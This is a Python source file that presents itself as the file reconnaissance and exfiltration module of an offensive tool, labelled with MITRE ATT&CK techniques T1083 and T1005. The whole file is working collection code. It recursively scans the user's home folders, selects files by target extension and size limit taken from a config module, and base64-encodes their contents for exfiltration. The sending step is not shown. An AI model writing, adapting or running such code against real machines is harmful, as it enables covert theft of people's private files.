"""
Module 2: File Reconnaissance & Exfiltration
MITRE ATT&CK: T1083 (File and Directory Discovery), T1005 (Data from Local System)
Scans directory tree and exfiltrates targeted files.
"""

import os
import base64
from config import MAX_FILE_SIZE_MB, FILE_EXTENSIONS, SCAN_DIRECTORIES


def get_directory_tree(max_depth=3):
    """
    Build a directory tree of key user folders.
    Returns a nested dict representing the file structure.
    """
    home = os.path.expanduser("~")
    tree = {}

    for scan_dir in SCAN_DIRECTORIES:
        full_path = os.path.join(home, scan_dir)
        if os.path.exists(full_path):
            tree[scan_dir] = _scan_directory(full_path, current_depth=0, max_depth=max_depth)

    return tree


def _scan_directory(path, current_depth, max_depth):
    """Recursively scan a directory up to max_depth."""
    result = {"files": [], "dirs": {}}

    if current_depth >= max_depth:
        return result

    try:
        entries = os.listdir(path)
    except PermissionError:
        result["error"] = "Permission denied"
        return result

    for entry in entries:
        full_path = os.path.join(path, entry)
        try:
            if os.path.isfile(full_path):
                size_mb = os.path.getsize(full_path) / (1024 * 1024)
                ext = os.path.splitext(entry)[1].lower()
                result["files"].append({
                    "name": entry,
                    "size_mb": round(size_mb, 2),
                    "extension": ext,
                    "path": full_path
                })
            elif os.path.isdir(full_path):
                result["dirs"][entry] = _scan_directory(
                    full_path, current_depth + 1, max_depth
                )
        except (PermissionError, OSError):
            continue

    return result


def find_interesting_files():
    """Find files matching target extensions in scan directories."""
    home = os.path.expanduser("~")
    interesting = []

    for scan_dir in SCAN_DIRECTORIES:
        full_path = os.path.join(home, scan_dir)
        if not os.path.exists(full_path):
            continue

        for root, dirs, files in os.walk(full_path):
            for fname in files:
                ext = os.path.splitext(fname)[1].lower()
                if ext in FILE_EXTENSIONS:
                    fpath = os.path.join(root, fname)
                    try:
                        size_mb = os.path.getsize(fpath) / (1024 * 1024)
                        if size_mb <= MAX_FILE_SIZE_MB:
                            interesting.append({
                                "name": fname,
                                "path": fpath,
                                "size_mb": round(size_mb, 2),
                                "extension": ext
                            })
                    except OSError:
                        continue

    return interesting


def exfiltrate_file(file_path):
    """
    Read a file and return its contents as base64.
    Only exfiltrates files under the size limit.
    """
    try:
        size_mb = os.path.getsize(file_path) / (1024 * 1024)
        if size_mb > MAX_FILE_SIZE_MB:
            return None, f"File too large: {size_mb:.2f} MB"

        with open(file_path, "rb") as f:
            content = f.read()

        return {
            "filename": os.path.basename(file_path),
            "path": file_path,
            "size_bytes": len(content),
            "content_b64": base64.b64encode(content).decode("utf-8")
        }, None

    except Exception as e:
        return None, str(e)


def get_file_summary():
    """Get a summary of the file recon - tree + interesting files."""
    return {
        "directory_tree": get_directory_tree(max_depth=2),
        "interesting_files": find_interesting_files(),
        "scan_directories": SCAN_DIRECTORIES,
        "target_extensions": FILE_EXTENSIONS
    }


if __name__ == "__main__":
    import json
    summary = get_file_summary()
    print(f"Directory tree scanned: {len(summary['directory_tree'])} directories")
    print(f"Interesting files found: {len(summary['interesting_files'])}")
    for f in summary["interesting_files"][:10]:
        print(f"  {f['name']} ({f['size_mb']} MB) - {f['path']}")
